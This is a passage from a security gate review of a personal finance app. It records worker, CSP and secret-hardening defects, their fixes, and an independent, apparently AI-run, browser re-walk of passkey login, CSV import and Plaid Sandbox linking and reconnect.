| **C-6**  | RUNBOOK "what survives a disconnect"; SSE per-session cap | **CLOSED.** The RUNBOOK section exists and is accurate; the SSE cap is real (G6). Disconnect behaviour matches what the RUNBOOK documents: `sealed_credentials` nulled, 394 transactions retained.                                                                                                                                                                                                                                                                                                               |

### 8.9 New findings

| ID  | Severity     | Finding                                                                                                                                                                                                                                        | State                                             |
| --- | ------------ | ---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- | ------------------------------------------------- |
| N-5 | **CRITICAL** | The worker calls `createConnectorRegistry()` with no config, so Plaid is unregistered in the only process that runs syncs — every `connections.sync` job dies `no connector is registered for provider "plaid"`. A linked Item can never sync. | **Fixed in place** + `regate-worker-boot.test.ts` |
| N-4 | **CRITICAL** | `compose.yml` caps `worker` at 512M while `KEK_ARGON2_MEMORY_KIB` is 1 GiB: 189 silent restarts, no consumer pump, no job runner, no scheduler, `schedules` table empty. The file's own comment predicted this and told Phase 1 to fix it.     | **Fixed in place** + test                         |
| F-5 | **HIGH**     | C-2 did not close F-3. COEP `credentialless` does not exempt cross-origin _frames_, and `style-src-elem 'self'` blocks Link's inline style: Plaid Link could not open at all, silently.                                                        | **Fixed in place** + `csp-plaid` updated          |
| N-7 | **HIGH**     | The nightly fan-out polls `PROCESS_LOCAL_PROVIDERS` connections from the worker, which never staged them: every Manual and CSV connection flips to a false, sticky "Needs reconnection" after the first nightly run.                           | **Fixed in place** + test                         |
| N-1 | MEDIUM       | `just harden-secrets` does not cover `plaid_client_id`/`plaid_secret`/`plaid_env`; a deployment that hardens them per the RUNBOOK's prose crash-loops `api` **and** `worker` on `EACCES`.                                                      | **Reported** — diff below                         |
| N-6 | MEDIUM       | The worker's healthcheck is `node -e 'process.exit(0)'` — it cannot fail, and reported `healthy` throughout N-4's 189 restarts.                                                                                                                | **Reported**                                      |
| N-3 | LOW          | `CategoryPicker` offers only "Uncategorized" (no `GET /categories` route, `categories` table empty), so Phase 1's categorization is not user-reachable. The write path is real and was proven.                                                 | **Reported** — belongs with C-5                   |
| N-2 | LOW          | An active `compose.override.yml` — the documented way to enable Plaid — makes `just verify`/`just hardening-check` fail, because each compose file is rendered in isolation.                                                                   | **Reported**                                      |

Fix for **N-1** (not applied — a `justfile` change with no test surface this
gate wanted to add unilaterally):

```diff
-    # database_url and master_key are read by api/worker/migrator (10001).
-    for f in database_url master_key; do
+    # database_url, master_key and the three plaid_* secrets are read by
+    # api/worker/migrator (10001). Keep this list in step with compose.yml's
+    # `secrets:` on those services — gate-security-review.md §8.2 N-1: the
+    # plaid_* secrets landed in C-3 and never landed here, and 0400-owned-by-you
+    # makes both api and worker crash-loop on EACCES.
+    for f in database_url master_key plaid_client_id plaid_secret plaid_env; do
```

Also worth correcting in `RUNBOOK.md` step 6, which currently says the Plaid
secrets end at "mode 0400 via `just harden-secrets`, same as every other secret
here". They do not; its own `chmod 444` is what actually works today.

### 8.10 What this re-gate did **not** find, and why that matters

Everything the first gate found good is still good, and this reviewer re-proved
the parts that the walk touches: sealed credential custody (the Plaid
credential was sealed on exchange, opened only through `SecretBox.openText`
inside the container, nulled on disconnect); step-up on every connection
mutation (each of `POST /connections`, `POST /connections/plaid/exchange`,
`POST …/plaid/update-link-token`, `DELETE /connections/{id}` ran a real WebAuthn
assertion in the browser); user scoping; log hygiene (no token appears in any
`docker compose logs` output read during this walk, and the `/item/get` probes
were deliberately written to print status codes only).

Two controls refused _this reviewer_ mid-walk and were right to:

- **WebAuthn signature-counter / clone detection.** Re-attaching an exported
  credential with a stale `signCount` produced `401 invalid_credential` — the
  API refuses an authenticator whose counter has regressed. The harness was
  changed to advance the counter; the refusal is correct behaviour.
- **Login rate limiting.** A tight retry loop earned
  `429 {"code":"rate_limited","detail":"Too many attempts. Try again in 13 seconds."}`.
  The harness backs off now.

Neither is a finding. Both are recorded because "a control refused a legitimate
automated client" is the only evidence that it would refuse an illegitimate one.

### 8.11 FINAL VERDICT for Phase 1 — GO-WITH-CONDITIONS

Not a GO, and not a NO-GO. The reasoning, stated as plainly as the first gate's:

**Why not NO-GO.** Every condition the first gate raised is now either closed or
closed-with-a-fix-in-this-document, and the full Phase 1 user path was walked
end to end in a real browser against the real production stack for the first
time in this project's life: passkey enrolment, passkey login, a Manual
account, a CSV import, transactions, a note that persists, real balances, real
Plaid Link in Sandbox, a first sync of 394 transactions, a forced reauth, a
Reconnect with no data loss, a **scheduled** worker sync with no user action,
and a disconnect independently confirmed at Plaid (`ITEM_NOT_FOUND`). The
domain code remains the strongest work in this repo — seven of seven sabotages
of the remediation controls went red on the first try, against tests other
people wrote.

**Why not GO.** Two of the four defects this gate fixed were **CRITICAL** and
both were in the worker: in the deployed system as committed at `a438ec8`,
the worker had **never executed a single job**, and even once it could, it could
not sync Plaid. A phase whose exit criterion is _"institutions syncing on
schedule"_ shipped a deployment in which the scheduler had never started and the
Plaid connector was never registered in the process that schedules. Both were
invisible to 1481 passing tests, a green `just verify`, and two rounds of
sabotage-tested remediation evidence — and both were found in the first fifteen
minutes of _watching the containers do the thing_. That is now **four
consecutive gate rounds** in which the decisive finding came from running the
system rather than from testing it, and the same mechanism each time: a
hand-maintained half of a computed pair (image prune, Caddyfile prefixes,
`harden-secrets`' secret list, the worker's registry, the worker's memory
limit), or a control that derives its expectation from the artifact it checks
(the CSP probe reading `onload` for a failure mode that fires no event).

The fixes are applied and each is pinned by a test that this reviewer watched
fail against the original defect. But **this gate wrote four fixes to code it
did not own, and the walk that validated them was run by the same reviewer**.
That is exactly the shape this project has learned not to trust. Hence
conditions rather than a clean pass.

#### Conditions for Phase 1 exit

| #        | Condition                                                                                                                                                                                                                                                                                             | Severity | Owner                |
| -------- | ----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- | -------- | -------------------- |
| **D-1**  | **Ratify the two CSP/COEP trades in §8.4** — `Cross-Origin-Embedder-Policy: unsafe-none` and `style-src-elem 'unsafe-inline' https://cdn.plaid.com`, both Plaid-enabled only. They are the only way to embed Link, but they are security decisions and must be a decision on file, not a gate's edit. | **HIGH** | Chris + security     |
| **D-2**  | **Re-walk steps 7–11 once, by someone who did not write these fixes**, on a stack rebuilt from the commit that lands them. Specifically: Link opens, first sync completes, a scheduled sync fires, disconnect removes the Item. This is C-4's own lesson applied to C-4's own fixes.                  | **HIGH** | independent reviewer |
| **D-3**  | **Give the worker a healthcheck that can fail** (N-6) — e.g. the job runner's last poll within `JOB_POLL_INTERVAL_MS × k`. Without it, the next silent worker death is again invisible, and N-4's 189 restarts reported `healthy` the whole time.                                                     | **HIGH** | devops               |
| **D-4**  | **Fix `just harden-secrets` (N-1)** with the diff in §8.9, and correct `RUNBOOK.md` step 6's claim. Add a check that every secret a service mounts in `compose.yml` is chowned to that service's uid — the computed version of the list that rotted.                                                  | MEDIUM   | devops               |
| **D-5**  | **Decide the durable staging question for Manual/CSV (N-7).** The filter applied here is correct but is a mitigation: `ManualStore` being an in-memory `Map` also means a _user-triggered_ sync after an api restart fails. `domain.ts` already names this as `@ctx/connections`'s to build.          | MEDIUM   | connector-port owner |
| **D-6**  | **Route the category taxonomy (N-3)** so Phase 1's categorization is reachable from the app, or state explicitly that it is Phase 2 scope and that `CategoryPicker` is knowingly inert until then. Fold into C-5's `merchantId` decision.                                                             | MEDIUM   | architecture         |
| **D-7**  | Render compose overrides layered rather than standalone in `scripts/compose-hardening-check.sh` (N-2), so the documented local-override workflow does not break `just verify`.                                                                                                                        | LOW      | devops               |
| **C-1c** | _(carried, unchanged)_ Verify the image-closure step in a real GitHub Actions run. No environment available to this gate or the last has a remote.                                                                                                                                                    | HIGH     | devops               |
| **C-5**  | _(carried, unchanged)_ Decide R-4 (`merchantId` resolution) before Phase 2.                                                                                                                                                                                                                           | MEDIUM   | architecture         |

**Not conditions, carried forward:** two _real_ institutions syncing on
schedule, and "zero internal transfers on a month of real data", still need
Chris's own accounts. What changed is that the mechanism underneath them is now
observed working, against real Plaid, in the real stack — which it was not
before today.

### 8.12 Reproduction and tree state

```
$ git status --short
 M apps/api/src/modules.ts                       # N-7 fix (fan-out excludes process-local providers)
 M apps/api/src/worker.ts                        # N-5 fix (registry built from config)
 M apps/web/e2e/csp-plaid.spec.ts                # F-5: committed policy expectations updated
 M apps/web/e2e/csp-static-server.mjs            # F-5: the new {plaid_style_src} placeholder
 M compose.yml                                   # N-4 fix (worker 512M -> 1536M)
 M docker/Caddyfile                              # F-5 fix (COEP unsafe-none, style-src-elem)
 M docs/evidence/phase-1/gate-security-review.md # this section
?? apps/api/test/regate-worker-boot.test.ts      # N-4/N-5/N-7 regression tests
?? docs/evidence/phase-1/screenshots/regate-*.png
```

Nothing else. Every sabotage was restored and each restore verified with
`git diff --quiet <file>`.

**Stack teardown:** `docker compose down -v`. The Sandbox Item was removed
before teardown and independently confirmed gone at Plaid (`ITEM_NOT_FOUND`).
`compose.override.yml` deleted, `.env` restored from backup, and the three
`secrets/plaid_*` files restored to the mode they were found in (`0400`) —
**which means this deployment will not boot until N-1 is fixed or the files are
`chmod 0444`.** That is deliberate: the environment is left exactly as found,
and the finding stands rather than being quietly papered over.

**Evidence hygiene.** The `just bootstrap-user` enrolment token was single-use
and has been consumed; it is not in this document. No Plaid client id, secret,
`access_token`, `link_token` value beyond the non-secret `link-sandbox-…`
handles Plaid itself prints in its UI, session cookie or CSRF token appears
anywhere in this section. The `/sandbox/item/reset_login` and `/item/get`
probes were written to run entirely inside the api container and to print HTTP
status codes and error codes only; the token stash they used lived in the
container's tmpfs and was deleted by the probe itself.
`ins_109508` / `user_good` / `pass_good` are Plaid's published Sandbox test
credentials, not secrets.

**The browser walk scripts** are in `/tmp/regate/` (`support.mjs`, `walk1`–`walk9`,
`probe-*.mjs`), deliberately outside the repo so `docs/` needs no eslint
widening for browser globals — same choice §7 made. They are run from
`apps/web` so `@playwright/test` resolves. The construction is identical to §7's
`gate-walk.mjs` (SPKI-pinned internal CA, CDP virtual authenticator, host
resolver rules), with three additions this walk needed: credential export/import
across stages via `WebAuthn.getCredentials`/`addCredential` with an advancing
`signCount`, a login retry that respects the rate limiter, and the Plaid Link
driver in `walk5.mjs` keyed on Link's own stable element ids (`#aut-button`,
`#aut-secondary-button`, `#aut-ins_109508`, `#aut-input-0-input`).

### 8.13 Final `just verify` — green, with the fixes in

```
$ DATABASE_URL=postgres://personalfi:personalfi@127.0.0.1:5433/personalfi_dev just verify

check-proxy-routes: PASS — docker/Caddyfile routes exactly '/api/*' to the api, …
                    covering all 11 contract prefix(es).
 Test Files  96 passed | 1 skipped (97)
      Tests  1486 passed | 2 skipped (1488)        # 1481 baseline + 5 re-gate tests
 Test Files  14 passed (14)
      Tests  80 passed (80)                        # apps/web
=== verify: playwright (smoke + csp) ===           9 passed
=== verify: gitleaks (full history) ===            clean
=== verify: license gate + THIRD_PARTY.md drift === license gate: PASS (286 prod, 622 dev)
=== verify: compose hardening ===                  SELF-TEST PASS (19/19); PASS (3 files)
=== verify: trivy filesystem scan ===              clean
=== verify: PASS (this is the run that predicts CI) ===
```

**One more control caught this reviewer mid-fix, and is worth recording.** The
first run after the F-5 Caddyfile change failed `csp.spec.ts` with
`style-src-elem blocked http://localhost:5184/assets/index-BTx3NEJG.css` — the
app's own stylesheet. Cause: `apps/web/e2e/csp-static-server.mjs` resolves the
Caddyfile's `map` placeholders to their Plaid-disabled defaults, and F-5 added a
**fifth** placeholder (`{plaid_style_src}`) that its table did not know, so
`style-src-elem 'self'{plaid_style_src}` shipped a malformed source list that
blocked everything. Fixed in the same file (one entry plus the comment saying
why). That is the same hand-maintained-list failure this document has now named
six times — caught this time, by an existing test, within minutes. It is the
fifth file in the diff below.

---

## 9. D-2 independent re-walk

**Reviewer:** Opus, independent. This reviewer did not write the re-gate's four
fixes (`49228fe`), nor any of the three close-out commits it is validating
(`01a4d7c` categories + D25, `919902e` durable staging, `05c09b5` worker
healthcheck + `harden-secrets` + layered override). Everything below was
observed on a stack **built from `HEAD` = `d037329`** and torn down afterwards.

A first attempt at this re-walk was killed by a rate limit at step 6. It is not
reused: the stack was rebuilt, the database volume destroyed (`down -v`), a new
user bootstrapped, a new internal CA pinned, and every `d2-*` screenshot in this
section was taken by this run. The only thing carried over from the killed
attempt is the shape of the Playwright harness, which is itself carried from
§7/§8.3 so the walks stay comparable.

### 9.1 The stack, from HEAD

```
$ docker compose build && docker compose up -d
$ docker compose ps
SERVICE   STATE     STATUS
api       running   Up (healthy)
backup    running   Up (healthy)
db        running   Up (healthy)
proxy     running   Up (healthy)
worker    running   Up (healthy)
```

Five of five healthy, including the **new** worker healthcheck from `05c09b5`
(D-3) — which is sabotaged in §9.6 rather than taken on trust.

Plaid was enabled the way the RUNBOOK and `compose.override.example.yml`
describe: a local `compose.override.yml` copied from the example with the three
commented `PLAID_ENABLED: 'true'` blocks uncommented, and nothing else changed —
no `.env` edit. Confirmed as compose actually renders it, not as written:

```
$ docker compose config --format json | node -e "…"
proxy true
api true
worker true
```

`secrets/plaid_client_id`, `plaid_secret` and `plaid_env` were found already
hardened and were **not touched**: `-r-------- 10001 10001` each. `just
harden-secrets` needs a `sudo` this reviewer does not have, so D-4's computed
check was run instead and passes on the real tree:

```
$ bash scripts/check-secret-ownership.sh
  hardening in progress: 9 secret(s) held to the strict bar, 0 violation(s)
check-secret-ownership: PASS
```

Both the api and the worker report the secrets present and Plaid registered:

```
api:    plaid configured; connector registered {"provider":"plaid","environment":"sandbox"}
api:    "secretsPresent":["database_url","master_key","plaid_client_id","plaid_secret","plaid_env"]
worker: "secretsPresent":["database_url","master_key","plaid_client_id","plaid_secret","plaid_env"]
```

— i.e. N-1 and N-5 both stay closed on a hardened install.

### 9.2 The walk harness

Same construction as §7 and §8.3, deliberately:

- **the real internal CA, pinned by SPKI hash.** Chromium launched with
  `--ignore-certificate-errors-spki-list=<sha256 of Caddy's leaf SPKI>` and
  `ignoreHTTPSErrors: false`; chain separately checked with `curl --cacert`
  against the root copied out of the proxy container:
  `ssl_verify_result=0 http=200`.
- **a real CDP virtual authenticator** (`WebAuthn.addVirtualAuthenticator`,
  ctap2/internal, resident key, user verification), credentials exported with
  `WebAuthn.getCredentials` and re-attached per stage with `addCredential` and an
  advancing `signCount`, so every ceremony — enrolment, login, and each step-up
  assertion — is a real one.
- `--host-resolver-rules=MAP personalfi.lan 127.0.0.1`; no mocks, no route
  interception, no dev server.
- `securitypolicyviolation` collected via a **context**-level init script, so the
  listener also exists inside Link's `cdn.plaid.com` iframe rather than only in
  the top frame.

Live headers through Caddy with `PLAID_ENABLED=true` (observed, not read out of
the Caddyfile) — this is D-1's subject matter as landed:

```
content-security-policy: default-src 'self'; script-src 'self';
  script-src-elem 'self' https://cdn.plaid.com;
  frame-src 'self' https://cdn.plaid.com;
  style-src-elem 'self' 'unsafe-inline' https://cdn.plaid.com;
  style-src-attr 'unsafe-inline'; img-src 'self' data: blob:; font-src 'self';
  connect-src 'self' https://cdn.plaid.com https://sandbox.plaid.com https://production.plaid.com;
  worker-src 'self' blob:; manifest-src 'self'; object-src 'none';
  frame-ancestors 'none'; base-uri 'none'; form-action 'self'
cross-origin-embedder-policy: unsafe-none
```

### 9.3 Steps 0–1 — enrolment, login, and `/api/...`

| #   | Step                    | Observed through the real proxy                                                                                                                                                                                                                                | Screenshot                                    |
| --- | ----------------------- | -------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- | --------------------------------------------- |
| 0a  | Enrol a passkey         | `/register#token=…` → `POST /api/auth/register/options -> 200` → real `create()` on the virtual authenticator → `POST /api/auth/register/verify -> 200`; the app advanced to **"Add a backup passkey"**.                                                       | `d2-01-register.png`, `d2-02-after-enrol.png` |
| 0b  | Sign **out**, then in   | Signed out to force a cold login, then `POST /api/auth/login/options -> 200` → real assertion → **`POST /api/auth/login/verify -> 200 {"ok":true}`** → **`GET /api/auth/session -> 200 {"userId":"01a0ac4a-…","authMethod":"webauthn","fresh":true}`**.        | `d2-03-signed-in.png`                         |
| 1   | `/api/...` answers JSON | `GET /api/transactions -> 200 {"items":[],…}`, `/api/accounts -> 200 {"accounts":[]}`, `/api/connections -> 200`, `/api/connectors -> 200 {…"plaid"…}`, `/api/net-worth -> 200`, `/api/categories -> 200`. JSON, not `<!doctype html>` — **F-4 stays closed.** | `d2-04`/`d2-05`/`d2-06-*-empty.png`           |

Zero CSP violations and zero page errors across steps 0–1.

**Harness note, not a finding.** The backup-passkey step could not be completed:
one virtual authenticator already holding a resident credential for this
RP/user is correctly excluded by `excludeCredentials`, and the app reported
"Could not create that passkey. Try again." That is WebAuthn behaving as
specified, not a defect — D21's second authenticator needs a second device.

### 9.4 D2-1 (MEDIUM, new) — on a fresh install the category taxonomy is never seeded, so D-6 does not actually close

This is the first thing the walk found, and it is the same shape as every
decisive finding in this document: a control that is correct in itself but is
wired to the wrong moment.

`apps/api/src/app.ts` seeds the taxonomy in an `onReady` hook — once per api
**boot** — by asking identity for the primary user and passing its id to
`ensureTaxonomy`. The RUNBOOK's documented install order is step 4
`docker compose up` and _then_ step 7 `just bootstrap-user`. So on every fresh
install the hook runs when there is no user yet:

```
api boot:   {"users":0,"categoriesInserted":0,"msg":"category taxonomy ensured"}
$ just bootstrap-user name="D2 Reviewer" …
$ docker compose exec db psql … -c 'select count(*) from categories'
 0
$ curl … /api/categories
{"categories":[]}
```

and it stays empty indefinitely, because nothing asks the operator to restart
the api after enrolling. `CategoryPicker` then renders exactly one option,
`Uncategorized` — **the N-3 symptom, unchanged, on the deployment path the
RUNBOOK prescribes.** Proven to be the boot-order and nothing else by restarting
the container and changing nothing else:

```
$ docker compose restart api
api boot:   {"users":1,"categoriesInserted":153,"msg":"category taxonomy ensured"}
 count
   153
```

`app.ts`'s own doc comment anticipates the mirror-image risk ("hanging it off
`UserService.createPrimary` … would only ever run for users created _after_ this
release") and picks the boot pass to cover the upgrade case — but a boot-only
pass cannot cover the _install_ case, and the install case is the one every new
deployment takes. Both are needed.

**Not fixed here** (MEDIUM, not Critical/High). The exact diff, in
`apps/api/src/bin/bootstrap-user.ts` — the one other place that is already a
composition root and already knows the new user's id:

```diff
@@ apps/api/src/bin/bootstrap-user.ts
+import { ensureTaxonomy } from '@ctx/categorization';
@@
     user = await users.createPrimary({ displayName, displayTimezone: timezone });
     out(`user created      ${user.displayName} (${user.id})`);
     out(`time zone         ${user.displayTimezone}`);
+    // The api's `onReady` taxonomy pass (app.ts) runs once per boot and the
+    // RUNBOOK creates the user *after* `docker compose up`, so on a fresh
+    // install that pass saw zero users and seeded nothing (D-2 re-walk D2-1).
+    // Seed here too: boot covers upgrades, this covers installs.
+    const seeded = await ensureTaxonomy(pool, { userIds: [user.id], clock: systemClock });
+    out(`categories        ${seeded.categoriesInserted} seeded`);
```

A regression test belongs with it: build the app against a database with **no**
user, run `bootstrap-user`'s path, and assert `GET /categories` is non-empty
without an api restart. The existing D-6 tests all seed a user first, which is
why none of them sees this.

### 9.5 Steps 2–6 — Manual, CSV, transactions, a real category, balances, connections

The taxonomy was seeded (by the api restart in §9.4) before this stage, so the
category half of step 4 is walked against the **real** 153-row taxonomy, not a
hand-seeded row.

| #   | Step                        | Observed through the real proxy                                                                                                                                                                                                                                                                                                                                                                     | Screenshot                                                     |
| --- | --------------------------- | --------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- | -------------------------------------------------------------- |
| 2   | Manual account              | Add connection → tabs render from `GET /connectors` as **`["Bank or brokerage (Plaid)","File import","Manual account"]`** → "Rental property" → **`POST /api/connections -> 201 {"connectionId":"01a0ac52-2e73-…","accountIds":[…],"syncRunId":"01a0ac52-2e9e-…"}`**. Card: _Rental property — Connected · 1 account · Synced 0 seconds ago_.                                                       | `d2-07-add-connection-dialog.png`, `d2-08-manual-added.png`    |
| 3   | CSV import                  | File import tab → five-row `Date,Description,Amount` fixture, preset `iso_signed`, account "Checking 1234" → **`POST /api/imports/csv -> 200 {"connectionId":"01a0ac52-5f01-…","syncRunId":"01a0ac52-5f13-…"}`**.                                                                                                                                                                                   | `d2-09-csv-form.png`, `d2-10-csv-imported.png`                 |
| 3b  | Transactions visible        | `/transactions` lists all five, each on **Checking 1234**: _Sep 7 **D2 Rewalk Merchant** −$19.99_, _Sep 5 City Power AND Light −$131.40_, _Sep 3 **Whole Foods MKT** −$84.17_, _Sep 2 Acme Payroll Direct DEP +$2,450.00_, _Sep 1 **Blue Bottle Coffee** −$6.25_. The merchant names are D25's four-tier resolution working on raw descriptors (`BLUE BOTTLE COFFEE #4412` → _Blue Bottle Coffee_). | `d2-11-transactions-list.png`                                  |
| 4   | **Real category + a note**  | Detail sheet → `CategoryPicker` renders **133 selectable options across 21 `<optgroup>`s** from `GET /api/categories` (`Income · income`, `Transfers · transfer`, `Groceries`, `Dining & Drinks`, …) — not the single inert "Uncategorized" of N-3. Picked **"Supermarkets"** → `PATCH /api/transactions/{id} -> 200`. Note written, saved on blur → a second `PATCH -> 200`.                       | `d2-12-transaction-detail.png`, `d2-13-transaction-edited.png` |
| 4b  | …both persist over a reload | **Full page reload**, row re-opened: the select reads back `{"value":"01a0ac4f-2c36-…","label":"Supermarkets"}` and the textarea the exact note. Read back from the API as well, not just from the rendered control: `GET /api/transactions` → `{"categoryId":"01a0ac4f-2c36-…","note":"D-2 re-walk note: category + note persistence check","merchantName":"D2 Rewalk Merchant"}`. **Persisted.**  | `d2-14-transaction-persisted.png`                              |
| 5   | Accounts and balances       | `/accounts` renders both accounts under **CASH** with a Net worth tile; every balance reads **"No balance yet"** and `GET /api/net-worth -> {"asOf":null,"totals":[],"inputs":[…]}`. Neither the manual nor the CSV connector supplies a balance — correct for them; real balances arrive with Plaid in step 8.                                                                                     | `d2-15-accounts-balances.png`                                  |
| 6   | Connections                 | Both cards **Connected · 1 account · Synced …**, each with _Sync now_ / _Disconnect_ / _Show sync history_. The SSE pill tracked live from **"No syncs yet"** (before any connection) to **"Synced 0 seconds ago"**, so it is a live stream and not a static render.                                                                                                                                | `d2-16-connections-healthy.png`                                |

**Zero CSP violations, zero page errors, zero console errors across steps 2–6.**

#### D-5 — the api restart, which is the case N-7's mitigation did _not_ cover

Row counts and connector state captured, `docker compose restart api` (so every
process-local store in the api is empty), then **"Sync now" clicked in the real
browser on both connections**:

```
before:  transactions 5 | D2 statements file_import active | Rental property manual active
         connection_staged_facts: 5 transaction_added + 2 account rows (durable, 919902e)

$ docker compose restart api        # api reports healthy again

POST /api/connections/01a0ac52-5f01-…/sync -> 202 {"mode":"inline","syncRunId":"01a0ac54-a935-…","status":"success"}
POST /api/connections/01a0ac52-2e73-…/sync -> 202 {"mode":"inline","syncRunId":"01a0ac54-cca1-…","status":"success"}

after:   transactions 5   (no duplicates — the staging dedupe held)
         GET /api/connections -> both "status":"active", both lastSyncedAt advanced
         sync_runs: initial/success, initial/success, manual/success, manual/success — no AUTH_REQUIRED
```

Under the pre-`919902e` code this is exactly where the in-memory `ManualStore`
lost its state and the card flipped, falsely and permanently, to **"Needs
reconnection"**. It does not: both connections stay **Connected**, both sync,
and the five rows do not duplicate. **D-5 holds in the deployed system.**
Screenshots `d2-17-after-api-restart.png`, `d2-18-synced-after-restart.png`.

#### D2-2 (LOW, new) — `POST /api/imports/csv` reports `staged: 0` for every first upload

The contract describes `staged` as a count of rows staged
(`apps/api/src/routes/connections.ts:672`), and on the **new-connection** branch
it is hard-coded:

```ts
// apps/api/src/routes/connections.ts:727-733 — a new connection runs `link`,
// which stages every file itself, and the count is not plumbed back out.
return {
  connectionId: linked.connectionId,
  syncRunId: linked.syncRunId,
  staged: 0,
  skipped: 0,
  status: null,
};
```

The observed response for the five-row import was
`{"staged":0,"skipped":0,"status":null}` while `connection_staged_facts` held
five `transaction_added` rows. Nothing in the UI reads the field today, so the
impact is nil — but it is, once more, a reported signal that cannot distinguish
"staged nothing" from "staged everything", which is the failure mode this
document has now named seven times. Either plumb the count out of `link` or
mark the field nullable and document that the first upload does not report one.

### 9.6 Step 7 — Plaid Link under the production CSP

`ins_109508` / "First Platypus Bank", `user_good` and `pass_good` are Plaid's
**published** Sandbox test credentials, not secrets. No `client_id`, `secret`,
`access_token` or `link_token` value appears in this section beyond the
non-secret `link-sandbox-…` handles Link itself prints.

Add connection → **Bank or brokerage (Plaid)** → _Connect_:

```
POST /api/connections/plaid/link-token -> 200 {"linkToken":"link-sandbox-6e85ef09-…","expiresAt":…}
```

Link then ran, in the real browser, inside
`cdn.plaid.com/link/v2/stable/link.html`, and this reviewer drove Link's own UI
end to end:

| Link pane                     | Observed                                                                                                       |
| ----------------------------- | -------------------------------------------------------------------------------------------------------------- |
| consent                       | _"PersonalFi uses Plaid to connect your account"_ → **Continue without phone number**                          |
| institution search            | typed "Platypus" → the real result list (`Platypus No Products`, `Platypus OAuth Bank`, `First Platypus Bank`) |
| institution                   | **First Platypus Bank** → _3 associated institutions_ → the non-OAuth entry                                    |
| credentials                   | _"Log into First Platypus Bank"_ → `user_good` / `pass_good`                                                   |
| account picker                | _"Your accounts"_ — **14** accounts (Plaid Checking ••0000 $100.00, Saving ••1111, CD ••2222, …)               |
| verifying                     | _"Retrieving financial data from First Platypus Bank"_                                                         |
| **Success**                   | **"Your account has been successfully linked to PersonalFi"**                                                  |
| post-success enrolment upsell | _"Save First Platypus Bank with Plaid"_ → **Finish without saving**                                            |

then, back in the app:

```
POST /api/connections/plaid/exchange -> 201
  {"connectionId":"01a0ac63-76c3-7487-9aba-167252176450","relinked":false,
   "accountIds":[ …14 ids… ]}
```

**`securitypolicyviolation` events: zero.** Collected from every frame,
including Link's own `cdn.plaid.com` document (the listener is installed on the
browser _context_, not the page, so a refusal inside the child document is
visible). Zero page errors, zero console errors. Screenshots
`d2-19-plaid-tab.png`, `d2-21-plaid-00…13.png` (each Link pane), `d2-22-plaid-after.png`.

**Two harness traps worth recording**, because both look exactly like "Link did
not open"/"the exchange is broken" and neither is:

1. Link attaches **two** iframes — the UI (`link.html`) and a hidden 0×0
   `link-open.html`. A frame matcher keyed on `plaid.com` picks the hidden one,
   reads an empty `document.body`, and reports a Link that never rendered. Match
   `link.html`.
2. **`onSuccess` does not fire at the "Success" pane.** Link then shows an
   optional _"Save <bank> with Plaid"_ enrolment upsell, and only once that is
   dismissed (**Finish without saving**) does the callback run and the app
   exchange the public token. A walk that stops at the word "Success" has
   observed Plaid succeeding and the **application doing nothing** — this
   reviewer hit exactly that on the first attempt: Success on screen, `Plaid
configured`, and **no `POST /plaid/exchange` in the api log at all**. That is
   the same class of false signal as F-5's `onload` probe, in the walk rather
   than in a test, and it is worth pinning in whatever automated Link walk Phase
   2 builds.

### 9.7 Step 8 — the first sync completes

| What                    | Observed                                                                                                                                                                                                                                                                        |
| ----------------------- | ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| Connections card        | **First Platypus Bank — Connected · 14 accounts · Synced 1 minute ago** (not "Never synced": N-5 stays closed)                                                                                                                                                                  |
| SSE status pill, live   | `"Synced 1 minute ago"` → _Sync now_ → `"Synced 0 seconds ago"` within 2.5 s, with no reload                                                                                                                                                                                    |
| Sync path               | `POST /api/connections/{id}/sync -> 202 {"mode":"queued","jobId":"01a0ac64-bfc9-…"}` — **queued to the worker**, which executed it; the Manual/CSV ones came back `{"mode":"inline"}`                                                                                           |
| Data                    | **394 Plaid transactions**, **14 balance rows**, `sync_runs` `initial/success` for both `transactions` and `balances`, `sealed_credentials IS NOT NULL`                                                                                                                         |
| Transactions list       | `/transactions` shows Plaid rows (_Sep 10 ACH Electronic CreditGUSTO PAY_, _Uber_, _United Airlines_, …) and the account filter offers all 14 Plaid accounts plus Checking 1234 / Rental property                                                                               |
| `GET /api/transactions` | `summary {"count":399,…}` = 394 Plaid + the 5 CSV rows                                                                                                                                                                                                                          |
| **Balances** (step 5′)  | `/accounts` now reads **Net worth −$77,164.15**, **CASH $62,589.00**, _Plaid CD ••2222 +$1,000.00_, _Money Market ••4444 +$43,200.00_, **CREDIT CARDS −$5,430.00** … The manual and CSV accounts still read "No balance yet", which is correct for connectors that supply none. |

Screenshots `d2-23-after-first-sync.png`, `d2-24-sse-pill.png`,
`d2-25-transactions-after-plaid.png`, `d2-26-accounts-balances.png`. Zero CSP
violations, zero console errors.

### 9.8 Steps 9–11 — forced reauth, reconnect, scheduled sync, disconnect

#### Step 9a — forced reauth

Issued from **inside the api container**, using the deployment's own key custody
(`SecretBox.unlock` → `openText`), so the access token never left the process and
nothing but status codes was printed:

```
kek unlocked
credential keys present: access_token
POST https://sandbox.plaid.com/sandbox/item/reset_login -> 200 reset_login= true error= null
```

Next sync from the UI (`POST /connections/{id}/sync -> 202 {"mode":"queued","jobId":…}` —
the **worker** executed it) and the app changed, live over SSE, to:

> **1 connection needs attention** · **First Platypus Bank — Needs reconnection ·
> 14 accounts** · _Reconnect_ / _Sync now_ / _Disconnect_

Screenshot `d2-27-reauth-required.png`.

#### Step 9b — Reconnect, zero data loss

```
POST /api/connections/{id}/plaid/update-link-token -> 200 {"linkToken":"link-sandbox-40eaee2b-…"}
```

Link opened in **update mode** — _"Enter your password — Securely reconnect your
account. **User ID: use•••••**"_, i.e. it did not re-ask for the institution —
password `pass_good`, then:

```
POST /api/connections/{id}/reconnect -> 200
  {"connectionId":"01a0ac63-76c3-…","relinked":true,"accountIds":[ the SAME 14 ids ]}
```

Card back to **Connected · 14 accounts**. **Zero data loss, checked in the
database before and after:**

|                                | before reconnect  | after reconnect             |
| ------------------------------ | ----------------- | --------------------------- |
| Plaid transactions             | 394               | **394**                     |
| CSV transactions               | 5                 | **5**                       |
| Plaid accounts                 | 14                | **14** (same connection id) |
